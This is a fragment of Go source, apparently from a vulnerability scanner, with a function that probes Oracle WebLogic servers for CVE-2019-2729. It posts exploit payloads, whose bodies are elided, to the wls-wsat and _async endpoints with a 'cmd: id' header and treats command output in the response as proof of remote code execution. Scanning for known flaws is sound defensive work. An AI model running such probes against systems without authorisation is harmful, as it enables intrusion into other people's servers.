...
func CVE_2019_2729(url string) bool {
	...
	header["cmd"] = "id"
	header["SOAPAction"] = ""
	if req1, err := utils.HttpRequset(url+"/wls-wsat/CoordinatorPortType", "POST", payload1, false, header); err == nil {
		if req2, err2 := utils.HttpRequset(url+"/_async/AsyncResponseService", "POST", payload2, false, header); err2 == nil {
			req3, _ := utils.HttpRequset(url+"/_async/favicon.ico", "GET", "", false, nil)
			if (req1.StatusCode == 200 && strings.Contains(req1.Body, "uid")) || (req2.StatusCode == 202 && strings.Contains(req3.Body, "Vulnerable")) {
				log.Logger.Warn().Msg(fmt.Sprintf("Found vuln Weblogic CVE_2019_2729|%s\n", url))
				return true
			}
		}
	}
